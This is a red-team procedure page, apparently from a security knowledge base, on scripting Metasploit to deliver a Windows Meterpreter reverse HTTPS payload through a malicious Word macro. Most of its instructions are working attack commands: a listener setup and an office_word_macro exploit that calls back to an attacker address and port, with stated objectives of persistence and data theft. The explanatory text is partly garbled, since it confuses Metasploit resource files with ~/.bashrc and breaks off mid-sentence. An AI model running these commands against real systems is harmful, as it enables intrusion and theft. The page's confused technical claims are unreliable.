---
id: cedfd679-02da-475f-a9ce-a19a34af8651
name: Metasploit Scripting with Meterpreter Reverse HTTPS Payload
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:21.654432+00:00'
updated_at: '2023-04-10T20:25:00.988396+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
- '[[Persistence|TA0003 - Persistence]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
- '[[Office Application Startup|T1137 - Office Application Startup]]'
- '[[Scripting|T1064 - Scripting]]'
- '[[Web Service|T1102 - Web Service]]'
sub_techniques:
- '[[Windows Command Shell|T1059.003 - Windows Command Shell]]'
tags:
- '[[Metasploit]]'
- '[[Scripting Metasploit]]'
commands:
- '[[Create .rc file]]'
- '[[Edit .rc file]]'
- '[[Execute Word Macro exploit]]'
- '[[Run Metasploit Framework Console with Resource File]]'
- '[[Start Metasploit listener]]'
---

# Metasploit Scripting with Meterpreter Reverse HTTPS Payload

## Summary

Metasploit is a powerful tool that can be used to execute various post-exploitation tasks. One of the most popular payloads used in Metasploit is Meterpreter, which provides a powerful command and control interface to the attacker. By scripting Metasploit with Meterpreter Reverse HTTPS Payload, an 

## Description

# Description

Metasploit is a powerful tool that can be used to execute various post-exploitation tasks. One of the most popular payloads used in Metasploit is Meterpreter, which provides a powerful command and control interface to the attacker. By scripting Metasploit with Meterpreter Reverse HTTPS Payload, an attacker can automate post-exploitation tasks and evade detection. 

Technical Explanation: After configuring the shell settings, the attacker can execute Metasploit commands from a file. The Windows Meterpreter Reverse HTTPS Payload with Office Word Macro Exploit can be used to deliver the payload to the victim's machine. Once the payload is delivered, the attacker can use the Meterpreter Reverse HTTPS Payload to execute various post-exploitation tasks, such as stealing data, pivoting to other machines, and maintaining persistence. 

Business Value: This procedure can be used by red teams to test the effectiveness of their organization's defenses against post-exploitation attacks. By automating post-exploitation tasks with Meterpreter, red teams can simulate real-world attacks and provide valuable feedback to the organization's security team.

 

## Requirements

1. Access to a vulnerable machine

1. Authentication credentials for the vulnerable machine

1. Network access to the vulnerable machine

1. Metasploit Framework installed on the attacker's machine

 

## Defense

1. Implement strong authentication mechanisms to prevent unauthorized access to vulnerable machines

1. Monitor network traffic for suspicious activity, such as the delivery of Meterpreter payloads

1. Deploy endpoint protection solutions to detect and prevent the execution of malicious macros

 

## Objectives

1. Automate post-exploitation tasks with Metasploit

1. Maintain persistence on the victim's machine

1. Steal sensitive data from the victim's machine

 

# Instructions

1. Modify the .rc file

 



**Code**: [[.rc file]]



> The .rc file is a shell script that is executed whenever a new shell is started. It is used to configure various shell settings such as aliases, environment variables, and shell options. To modify the .rc file, simply open it in a text editor and add or remove the desired settings. The changes will take effect the next time a new shell is started.



**Command** ([[Create .rc file]]):

```bash
touch ~/.bashrc
```





**Command** ([[Edit .rc file]]):

```bash
nano ~/.bashrc
```



2. Create a file with Metasploit commands and save it with the .rc extension. Then, use this command to execute the commands from the file.

 



**Code**: [[msfconsole -r ./file.rc]]



> The 'msfconsole' command is used to launch the Metasploit Framework console. The '-r' option specifies the file containing the commands to execute. This command is useful when you have a large number of commands to run and don't want to manually enter them one by one. The file should contain one command per line. Once the file is created, simply pass the path to the file as an argument to the '-r' option and Metasploit will execute the commands in the file.



**Command** ([[Run Metasploit Framework Console with Resource File]]):

```bash
msfconsole -r ./file.rc
```



3. This command is used to exploit a vulnerability in Microsoft Word's macro feature to execute a Windows Meterpreter reverse HTTPS payload. The command sets the payload, local host and port, and whether or not to exit the session upon completion. The exploit is then executed in the background (-j) and without user interaction (-z).


 



**Code**: [[use exploit/multi/handler
set PAYLOAD windows/mete]]



> The 'use exploit/multi/handler' command sets up the exploit handler on the attacker's machine. The 'set PAYLOAD windows/meterpreter/reverse_https' command sets the type of payload to be used. The 'set LHOST 0.0.0.0' command sets the local host to listen on all available interfaces. The 'set LPORT 4646' command sets the local port to listen on. The 'set ExitOnSession false' command tells the exploit handler to keep running after a session is created. The 'exploit -j -z' command executes the exploit in the background and without user interaction.

The 'use exploit/multi/fileformat/office_word_macro' command sets up the Microsoft Word macro exploit. The 'set PAYLOAD windows/meterpreter/reverse_https' command sets the type of payload to be used. The 'set LHOST 10.10.14.22' command sets the attacker's IP address. The 'set LPORT 4646' command sets the port for the reverse shell connection. The 'exploit' command runs the exploit and connects back to the attacker's machine.



**Command** ([[Start Metasploit listener]]):

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 4646
set ExitOnSession false
exploit -j -z
```





**Command** ([[Execute Word Macro exploit]]):

```bash
use exploit/multi/fileformat/office_word_macro 
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 10.10.14.22
set LPORT 4646
exploit
```



## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]
- [[Persistence|TA0003 - Persistence]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]
- [[Office Application Startup|T1137 - Office Application Startup]]
- [[Scripting|T1064 - Scripting]]
- [[Web Service|T1102 - Web Service]]

### Sub-Techniques

- [[Windows Command Shell|T1059.003 - Windows Command Shell]]

## Commands Used

- [[Create .rc file]]
- [[Edit .rc file]]
- [[Execute Word Macro exploit]]
- [[Run Metasploit Framework Console with Resource File]]
- [[Start Metasploit listener]]

## Tags

- [[Metasploit]]
- [[Scripting Metasploit]]


